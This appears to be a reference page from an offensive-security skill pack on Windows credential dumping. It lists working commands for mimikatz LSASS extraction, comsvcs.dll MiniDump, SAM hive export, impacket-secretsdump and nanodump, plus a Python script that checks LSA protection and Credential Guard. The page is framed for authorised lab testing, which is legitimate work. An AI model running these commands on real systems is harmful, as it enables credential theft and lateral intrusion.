# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`credential-dumping`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `mimikatz` | `privilege::debug` then `sekurlsa::logonpasswords` | LSASS secret extraction, authorised lab only | Windows |
| `comsvcs.dll` MiniDump | `rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> C:\Windows\Temp\lsass.dmp full` | Dump via a signed binary, lab only | Windows |
| `reg save` | `reg save HKLM\SAM C:\Windows\Temp\sam.hiv /y` | Hive export for offline parsing | Windows |
| `impacket-secretsdump` | `impacket-secretsdump -sam sam.hiv -security sec.hiv -system sys.hiv LOCAL` | Offline hive parsing | Linux / Windows |
| `nanodump` | `nanodump.x64.exe --write C:\Windows\Temp\lsass.dmp` | Dump with handle minimisation, lab only | Windows |

## Minimal Lab Validation Script

Record the protection state for each credential store; the dump itself is a separate authorised step with evidence handling.

```python
import subprocess

def ps(cmd):
    return subprocess.run(["powershell", "-NoProfile", "-Command", cmd],
                          capture_output=True, text=True).stdout.strip()

ppl = ps("(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' "
         "-ErrorAction SilentlyContinue).RunAsPPL")
cg = ps("Get-CimInstance -ClassName Win32_DeviceGuard "
        "-Namespace root\\Microsoft\\Windows\\DeviceGuard | "
        "Select-Object -ExpandProperty SecurityServicesRunning")
cached = ps("(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon' "
            "-ErrorAction SilentlyContinue).CachedLogonsCount")
print("runasppl", ppl or "0-or-unset", "security_services", cg, "cached_logons", cached)
```

## Flag Notes

- `privilege::debug` is required before LSASS access in mimikatz; without it the command fails.
- `full` in the comsvcs dump requests a complete memory region rather than a minimal one.
- `LOCAL` in secretsdump parses hive files without contacting a domain controller.
